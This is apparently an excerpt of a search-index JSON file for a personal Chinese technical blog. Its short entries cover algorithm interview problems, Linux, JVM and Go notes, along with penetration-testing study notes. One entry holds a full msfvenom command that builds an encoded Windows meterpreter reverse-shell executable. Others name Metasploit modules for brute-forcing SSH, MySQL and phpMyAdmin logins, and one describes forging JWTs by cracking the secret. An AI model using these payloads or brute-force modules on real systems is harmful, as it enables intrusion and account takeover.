给定一棵二叉树的其中一个节点，请找出中序遍历序列的下一个节点。 注意： 如果给定的节点是中序遍历序列的最后一个，则返回空节点;","lvl0":"二叉树的下一个节点","lvl1":null,"lvl2":"摘要","objectID":"9eb3151d7a028d4f9b4b3231793e19ee","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E8%8A%82%E7%82%B9/"},{"content":"输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。 如果是则返回true，否则返回false。 假设输入的数组的任意两个数字都互不","lvl0":"二叉树的后序遍历序列","lvl1":null,"lvl2":"摘要","objectID":"cbecba729c65e6107ffee6495599096a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97/"},{"content":"二维数组查找 在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。 请完成一个函数，输入这样的一个二维数组","lvl0":"二维数组查找","lvl1":null,"lvl2":"摘要","objectID":"b0559639675a7780e44385bb3768a051","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%88%86or%E6%9F%A5%E6%89%BE/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE/"},{"content":"解题思路 $n\u0026amp;(n-1) 的结果为 110\u0026amp;101 ,得到 100,$ $n\u0026amp;(n-1),可以去掉一个1$ 1 2 3 4 5 6 7 8 9 10 11 class Solution { public: int NumberOf1(int n) { int res = 0; while(n) { res++; n = n\u0026amp;(n-1); } return res; } };","lvl0":"二进制中1的个数","lvl1":null,"lvl2":"摘要","objectID":"a3e0cc66d6bfe4d04f58481f49fc9ed5","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98/%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%AD1%E7%9A%84%E4%B8%AA%E6%95%B0/"},{"content":"koa 的相关使用 koa 是个 基于后端 的框架 学习视频 这里使用 egg 框架 1 2 3 4 5 6 7 8 9 10 yarn add egg-init -g egg-init --type=simple ## 安装 配置 yarn # run npm run dev 连接 MYSQL 1 2 3 4 5 6 # 安装 egg-mysql 库 yarn add","lvl0":"什么是KOA","lvl1":null,"lvl2":"摘要","objectID":"24b01cd6f559a15c043203020c8559a5","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/react%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/koa%E6%80%BB%E7%BB%93/%E4%BB%80%E4%B9%88%E6%98%AFkoa/"},{"content":"linux文件系统学习 学习教程1 学习教程2 linux内核学习教程 说话大声的教程，好用,EXT文件详解 文件系统的种类 U盘： FAT32 windows NTFS linux： EXT","lvl0":"什么是linux的文件系统","lvl1":null,"lvl2":"摘要","objectID":"681b39312320ec5fd05a3015699fb105","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/%E4%BB%80%E4%B9%88%E6%98%AFlinux%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"},{"content":"输入一个整数 n ，求从 1 到 n 这 n 个整数的十进制表示中 1 出现的次数。 例如输入 12 ，从 1 到 12 这些整数中包含 “1” 的数字有 1，10，1 ，10，11 和 12","lvl0":"从1到n中 1出现的次数","lvl1":null,"lvl2":"摘要","objectID":"46b9fec70ac9eaaafcc2aab2a80014bc","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E4%BB%8E1%E5%88%B0n%E4%B8%AD1%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0/"},{"content":"从尾到头打印链表 输入一个链表的头结点，按照 从尾到头 的顺序返回节点的值。 返回的结果用数组存储。 样例 1 2 输入：[2, 3, 5] 返回：[5, 3, 2] 1 2 3 4","lvl0":"从尾到头打印链表","lvl1":null,"lvl2":"摘要","objectID":"62a8b0fc15b20c9dc1a51ef6705cafc7","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/"},{"content":"jwt原理 jwt 是以 . 作为区分， 如果 使用 pyjwt 对密钥进行爆破，爆破出密钥，就能对 JWT 进行篡改了【伪造签名】 水平权限【权限控制】","lvl0":"会话管理","lvl1":null,"lvl2":"摘要","objectID":"7d6db2ea678f539a00bcddff65b614b9","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86/"},{"content":"伪文件的定义 伪文件 不用来存储数据，本身不占用任何空间。是文件系统的一部分，并按目录进行组织 。 目的：提供一种服务，采取和常规文件相同的访问方式","lvl0":"伪文件 管道、信号原理","lvl1":null,"lvl2":"摘要","objectID":"47b4ef31d691bbbdccc0a8287f264499","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E4%BC%AA%E6%96%87%E4%BB%B6-%E7%AE%A1%E9%81%93-%E4%BF%A1%E5%8F%B7%E5%8E%9F%E7%90%86/"},{"content":"使用vim的问题总结 1. 从网页复制的 yml到编辑器，编辑器缩进不对 解决的文章 解决vi/vim中粘贴会在行首多很多缩进和空格的问题 解决办法： 在拷","lvl0":"使用vim后遇到的一些问题【必知必会】","lvl1":null,"lvl2":"摘要","objectID":"78295063b6e081395e87af457f4cf229","tags":["shell命令学习","vim"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/vim%E5%AD%A6%E4%B9%A0/%E4%BD%BF%E7%94%A8vim%E5%90%8E%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"},{"content":"插入模式和覆盖模式 按 insert 键 ，可以 改为插入模式和覆盖模式： 插入模式，直接插入字符 覆盖模式，后面的被前面覆盖 快速选中一行【块】 shift + home shift + end shift + 上下","lvl0":"其他快捷键记录","lvl1":null,"lvl2":"摘要","objectID":"e8ae31171d0d8c86364bff96564b9b2c","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/windows10%E5%AD%A6%E4%B9%A0/%E5%85%B6%E4%BB%96%E5%BF%AB%E6%8D%B7%E9%94%AE%E8%AE%B0%E5%BD%95/"},{"content":"内网知识学习 内网渗透教程 工作组原理","lvl0":"内网知识学习","lvl1":null,"lvl2":"摘要","objectID":"db7d6900c80eb36e35b2b485aa831da0","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"},{"content":"","lvl0":"分布式环境 leader选举","lvl1":null,"lvl2":"摘要","objectID":"25b6a08035eed558ef6dc115768b69db","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/leader%E9%80%89%E4%B8%BE%E4%BA%92%E6%96%A5%E9%94%81-etcd%E7%AD%89/"},{"content":"在一个排序的链表中，存在重复的结点，请删除该链表中重复的结点，重复的结点不保留。 样例1 1 2 3 输入：1-\u0026gt;2-\u0026gt;3-\u0026gt;3-\u0026","lvl0":"删除链表重复节点","lvl1":null,"lvl2":"摘要","objectID":"31c50168099f6110fbb960e571455c0b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E9%87%8D%E5%A4%8D%E8%8A%82%E7%82%B9/"},{"content":"制作 0 day 漏洞网页","lvl0":"制作 0day漏洞网页","lvl1":null,"lvl2":"摘要","objectID":"2dd4a322d6561bfd229d0f4ecb4f813e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/metasploit/%E5%88%B6%E4%BD%9C0day-%E6%BC%8F%E6%B4%9E%E7%BD%91%E9%A1%B5/"},{"content":"msf 制作后面软件 1 2 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -b \u0026#34;\\x00\u0026#34; -e x86/shikata_ga_nai -i 10 -f exe -o ./a.exe 参数说明 -a 指定 架构 x86 、x64。 x86 代表32位， x 64 表示 64位。 --platform 指定平台 通过--l platforms 查","lvl0":"制作后面软件","lvl1":null,"lvl2":"摘要","objectID":"ed27ca8c7db990b3551ef7918bf688dc","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/metasploit/%E5%88%B6%E4%BD%9C%E5%90%8E%E9%9D%A2%E8%BD%AF%E4%BB%B6/"},{"content":"前端面试交流会笔记总结 1.面试（重点） 基础知识 举一反三 认真对待（面评） 吹牛逼 企业面试前100题目网站","lvl0":"前端面试交流会笔记","lvl1":null,"lvl2":"摘要","objectID":"735e75d892fb47c446666d0dc33b3995","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E4%BA%A4%E6%B5%81%E4%BC%9A%E7%AC%94%E8%AE%B0/"},{"content":"剪绳子 给你一根长度为 n 绳子，请把绳子剪成 m 段（m、n 都是整数，$2≤n≤58$ 并且 $m≥2$ ）。 每段的绳子的长度记为$ k[1]、k[2]、…","lvl0":"剪绳子","lvl1":null,"lvl2":"摘要","objectID":"7b4dce0d83cc404c6f893496d0f5a061","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98/%E5%89%AA%E7%BB%B3%E5%AD%90/"},{"content":"包含min函数的栈 设计一个支持push，pop，top等操作并且可以在$O(1)$时间内检索出最小元素的堆栈。 push(x)–将元素x插入栈","lvl0":"包含min函数的栈","lvl1":null,"lvl2":"摘要","objectID":"8db5d239f850e945e144c9ee7bd96d0d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E6%A0%88/%E5%8C%85%E5%90%ABmin%E5%87%BD%E6%95%B0%E7%9A%84%E6%A0%88/"},{"content":"1:1 线程模型 以上我提到的内核线程（Kernel-Level Thread, KLT）是由操作系统内核支持的线程，内核通过调度器对线程进行调度，并负责完成线程的","lvl0":"协程的原理","lvl1":null,"lvl2":"摘要","objectID":"09f346f685563528df0c38734b95c462","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8E%9F%E7%90%86/"},{"content":"协议 概念： 协议是事先约定好的，大家共同遵守 的一组规则 可以简单理解为各个主机之间通信的使用的共同的语言。 **应用层：**就是应用软件使用的协议","lvl0":"协议相关的内容【网络基础】","lvl1":null,"lvl2":"摘要","objectID":"26ff065cd1963968ec6955906ea6a00d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"},{"content":"解题思路 归并排序 解题代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */ class Solution { public: ListNode* merge(ListNode*","lvl0":"合并两个排序链表","lvl1":null,"lvl2":"摘要","objectID":"c86c58cdf4b30a1c5192008c3ae70741","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8/"},{"content":"面试总结 抓包问题， 需要理解的： tcpdump go语言 比如 实现一个 网络连接 传输文件","lvl0":"品高软件","lvl1":null,"lvl2":"摘要","objectID":"cc3331854ee4ae035a072d6492a761e0","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E5%93%81%E9%AB%98%E8%BD%AF%E4%BB%B6/"},{"content":"$0,1,\u0026hellip;,n-1$ 这 n 个数字 $(n\u0026gt;0) $ 排成一个圆圈，从数字 0 开始每次从这个圆圈里删除第 $ m $ 个数字。 求出这个圆圈里剩下的最后一个数字。 样例 1 2 3 输入：n=5 , m=3 输","lvl0":"圆圈中最后一个数【小米笔试题】","lvl1":null,"lvl2":"摘要","objectID":"290c4907b515664ab8986848e41335b5","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E7%BA%A6%E7%91%9F%E5%A4%AB%E7%8E%AF%E5%9C%86%E5%9C%88%E4%B8%AD%E6%9C%80%E5%90%8E%E4%B8%80%E4%B8%AA%E6%95%B0%E5%B0%8F%E7%B1%B3%E7%AC%94%E8%AF%95%E9%A2%98/"},{"content":"垃圾回收机制 讲一下堆常见的分配策略 对象优先在Eden区分配 第一次垃圾回收后，如果s区放不下，那么只能通过==分配担保机制==把新生代的对象提","lvl0":"垃圾回收机制","lvl1":null,"lvl2":"摘要","objectID":"9875ba02b92650e4a721e7dec55fde4f","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"},{"content":"免责声明： 这个是我学习网络的笔记，不要拿笔记上的方法来做坏事,后果自负 hping3使用方法 hping3 hping 是 面向命令行的用于生成和解析TCP/IP协议数","lvl0":"基于ping 命令探测学习","lvl1":null,"lvl2":"摘要","objectID":"c848933af329baa9d88ae60e821454f4","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/kali%E5%9F%BA%E7%A1%80/ping%E5%91%BD%E4%BB%A4%E6%8E%A2%E6%B5%8B/"},{"content":"基础命令 chmod ， change mod 修改模式，比如 chmod a+x app.sh cd , change directory , 切换目录 ls -l, 用列表的方式展示【 -l 表示 一行一个，列表的方式】 chown ,change owner ,改变所属用户 chgrp,change group ,改变所属组","lvl0":"基础命令","lvl1":null,"lvl2":"摘要","objectID":"361650a846d86841aae7c3e3faf97dfd","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"content":"请实现一个函数可以复制一个复杂链表。 在复杂链表中，每个结点除了有一个指针指向下一个结点外，还有一个额外的指针指向链表中的任意结点或者null","lvl0":"复制链表","lvl1":null,"lvl2":"摘要","objectID":"4b4434a7ea1bd5f0138413f261e0440a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E5%A4%8D%E5%88%B6%E9%93%BE%E8%A1%A8/"},{"content":"定义一个函数，输入一个链表的头结点，反转该链表并输出反转后链表的头结点。 思考题： 请同时实现迭代版本和递归版本。 样例 1 2 3 输入:1-\u0026gt;2","lvl0":"头插法，翻转链表","lvl1":null,"lvl2":"摘要","objectID":"ac76e363f9d2b924f14ac9a5263e24f6","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E9%93%BE%E8%A1%A8/%E5%A4%B4%E6%8F%92%E6%B3%95_%E7%BF%BB%E8%BD%AC%E9%93%BE%E8%A1%A8/"},{"content":"剑指 Offer II 097. 子序列的数目 Difficulty: 困难 给定一个字符串 s和一个字符串 t ，计算在 s 的子序列中 t 出现的个数。 字符串的一个 子序列 是指，通过删除一些（也可以不删","lvl0":"子序列的数目","lvl1":null,"lvl2":"摘要","objectID":"bf36a74419b26c60c26310109967bb70","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/dp%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/%E5%AD%90%E5%BA%8F%E5%88%97%E7%9A%84%E6%95%B0%E7%9B%AE/"},{"content":"学习资料收集 靶场 不错的UP主视频 学神 kali 靶机练习教程 千峰学习资料 心东的学习教程, 这个视频的老哥有点牛逼 小迪渗透 学习网站 10.HackingLo","lvl0":"学习资料收集","lvl1":null,"lvl2":"摘要","objectID":"ac04d0f8faace03d9cc262b0a97e5151","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86/%E6%94%B6%E9%9B%86%E8%B5%84%E6%96%99/"},{"content":"安装完VirtualBox4.0.0后，主机多了一个“VirtualBox Host-Only Network ”本地网卡，IP和DNS是自动获取的，在以后的VBox网络配置","lvl0":"安装metasploit","lvl1":null,"lvl2":"摘要","objectID":"7b1cebaa44ac915ebf0d1929967ae1a9","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9Dwin7/%E6%B8%97%E9%80%8Fwin7/"},{"content":"安装unbuntu子系统笔记 开启虚拟化，开启 windows子系统配置 安装软件【略】 修改root密码 1 2 sudo passwd root # 设置新密码 设置国内 apt镜像源","lvl0":"安装unbuntu子系统学习","lvl1":null,"lvl2":"摘要","objectID":"de132d4b21416e7e1e8ca5a0d31fd074","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/windows10%E5%AD%A6%E4%B9%A0/%E5%AE%89%E8%A3%85unbuntu%E5%AD%90%E7%B3%BB%E7%BB%9F/"},{"content":"安装教程 https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version 这就 wget https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version 卸载的方法 https://www.cnblogs.com/hanshuai/p/8745952.html 1 sudo apt-get remote metasploit-framework 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 connect xxx 80 :\u0026lt;\u0026lt;EOF [*] Connected to www.xx.xz:80 (via: 172.18.50.211:34915) get / HTTP/1.1 400 Bad Request Server: nginx Date:","lvl0":"安装和基本命令使用【bug解决方案】","lvl1":null,"lvl2":"摘要","objectID":"705e9642e18621f6bcfe2fabdb80d213","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/metasploit/%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"},{"content":"定位死锁的工具 如何定位死锁呢？ 可以用 jps 和 jstack 打印内存的信息 学习视频 怎么防止死锁【java编程】 作者：peonyX 链接：https://www.","lvl0":"定位死锁的工具","lvl1":null,"lvl2":"摘要","objectID":"f01cb930d02ec14ad9f878d65e32700b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E9%9D%A2%E8%AF%95%E5%BF%85%E9%97%AE_%E5%AE%9A%E4%BD%8D%E6%A3%80%E6%B5%8B%E6%AD%BB%E9%94%81/"},{"content":"词法分析原理 学习课程- 华南理工大学- 刘欣欣 参考教程 参考学习的课程 js 版本的课程 计算机编译的过程 词法分析 语法分析 中间代码生成 优化 目标代码产生 词法","lvl0":"实战脚本语言【词法分析】","lvl1":null,"lvl2":"摘要","objectID":"ab15222a6c77d4ec93c62f174772e032","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/%E5%AE%9E%E6%88%98%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/"},{"content":"线上问题定位的利器：线程栈 dump 为了便于分析定位线程问题，你需要给线程赋予一个有意义的名字，对于线程池可以通过自定义 ThreadFactory 来给线程池中的线程赋予有意","lvl0":"实践总论","lvl1":null,"lvl2":"摘要","objectID":"adb852ecab2ff5dc91cb3aa71a110ae3","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/%E5%AE%9E%E8%B7%B5%E6%80%BB%E8%AE%BA/"},{"content":"什么是寄存器，内存对齐 学习的视频 64位寄存器有 64根数据线， 一根线可以表示 0 和 1 这样子 64位 CPU GPRS （general-purposeRegist","lvl0":"寄存器原理，64位，32位","lvl1":["八股文"],"lvl2":"摘要","objectID":"471d59c9791a0c7d788fce1446efb048","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E9%80%9F%E6%88%90%E8%AF%BE/%E5%AF%84%E5%AD%98%E5%99%A8%E5%8E%9F%E7%90%8664%E4%BD%8D32%E4%BD%8D/"},{"content":"密码爆破 ssh密码爆破 模块名字： auxiliary/scanner/ssh/ssh_login Mysql密码爆破 auxiliary/scanner/mysql/mysql_login phpadmin 登录校验 auxiliary/scanner/http/phpadmin_login 相关博客资料","lvl0":"密码爆破","lvl1":null,"lvl2":"摘要","objectID":"f320346d408b3bd2fb97c8bdb5001fd4","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/kali-linux%E5%AD%A6%E4%B9%A0/metasploit/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"},{"content":"请实现一个函数，用来判断一棵二叉树是不是对称的。 如果一棵二叉树和它的镜像一样，那么它是对称的。 样例 1 2 3 4 5 6 7 8 9 10 11 12 13 如下图所示二叉树","lvl0":"对称二叉树","lvl1":null,"lvl2":"摘要","objectID":"54fe1b9518121b964ce5245032fd1fda","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"content":"封装websocket api 参考的相关文章 参考github的 example golang 后台 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38","lvl0":"封装websocket api 【golang后端】","lvl1":null,"lvl2":"摘要","objectID":"40a9291c03b1b70595d3f9254b1ee253","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/%E9%A1%B9%E7%9B%AE%E8%84%9A%E6%9C%AC/%E5%B0%81%E8%A3%85websocketapi/"},{"content":"如何将脚本加入环境变量 https://www.cnblogs.com/youyoui/p/10680329.html 1 2 3 4 vi /etc/profile # 在最后一行加上 export PATH=$PATH:/home/uusama/mysql/bin","lvl0":"将脚本加入环境变量","lvl1":null,"lvl2":"摘要","objectID":"2c87649c72b93cfb0da3fc5cc143b420","tags":["个人总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/linux/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/%E5%B0%86%E8%84%9A%E6%9C%AC%E5%8A%A0%E5%85%A5%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"content":"select in share mode 理解 SELECT … LOCK IN SHARE MODE ：共享锁(S锁, share locks)。其他事务可以读取数据，但不能对该数据进行修改，直到所有的共享锁被释放。 如果事务对某行","lvl0":"小麦","lvl1":null,"lvl2":"摘要","objectID":"567080fe12446b12a4208488238458f1","tags":["选择题刷题笔记","笔试总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/%E5%B0%8F%E9%BA%A6%E7%AC%94%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/"},{"content":"面试视频 eureka ，分布式，微服务 视频，工作6年， eureka,nacos 分布式事务怎么解决 base 理论： 基本可用，软状态，最终一致性 是什么： 多个服务协同完成这个事务 怎么做： 